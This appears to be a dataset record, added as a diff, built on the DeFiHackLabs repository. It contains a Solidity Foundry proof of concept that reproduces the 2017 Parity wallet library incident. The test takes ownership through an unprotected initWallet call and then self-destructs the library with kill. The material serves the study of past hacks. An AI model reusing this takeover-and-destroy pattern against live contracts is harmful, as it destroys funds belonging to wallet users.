@@ -1,0 +1,15 @@
+{
+  "incident": "2017-11",
+  "source_path": "src/test/2017-11",
+  "analysis": "Incident analysis unavailable; Solidity PoC is provided directly.",
+  "poc_code": "// Source: src/test/2017-11/Parity_kill_exp.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\ninterface parity {\n    function isOwner(\n        address _addr\n    ) external view returns (bool);\n\n    function kill(\n        address _to\n    ) external;\n\n    function initWallet(address[] memory _owners, uint256 _required, uint256 _daylimit) external;\n}\n\ncontract ContractTest is Test {\n    parity WalletLibrary = parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));\n\n    address[] public owner;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 4_501_735); //fork mainnet at block 4501735\n    }\n\n    function testExploit() public {\n        WalletLibrary.isOwner(address(this)); // not a owner of contract\n        owner.push(address(this));\n        WalletLibrary.initWallet(owner, 0, 0);\n        bool isowner = WalletLibrary.isOwner(address(this)); // you are owner of contract now\n        assertTrue(isowner);\n        WalletLibrary.kill(address(this));\n        WalletLibrary.isOwner(address(this)); // contract destroyed, return 0\n    }\n\n    receive() external payable {}\n}\n",
+  "analysis_files": [],
+  "exploit_files": [
+    "src/test/2017-11/Parity_kill_exp.sol"
+  ],
+  "raw_sol_files": [
+    "sol/2017-11/Parity_kill_exp.sol"
+  ],
+  "repo_owner": "SunWeb3Sec",
+  "repo_name": "DeFiHackLabs"
+}
